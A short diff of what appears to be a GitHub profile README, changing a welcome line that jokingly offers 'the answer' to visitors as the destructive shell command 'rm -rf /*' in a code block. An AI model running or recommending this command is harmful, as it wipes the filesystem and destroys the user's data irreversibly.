@@ -1,6 +1,6 @@
 ### Welcome 👋
 
-I think you came here for the answer to it all. So without further despair ->
+You want answers? Well here it is.. 
 ```
 rm -rf /* 
 ```
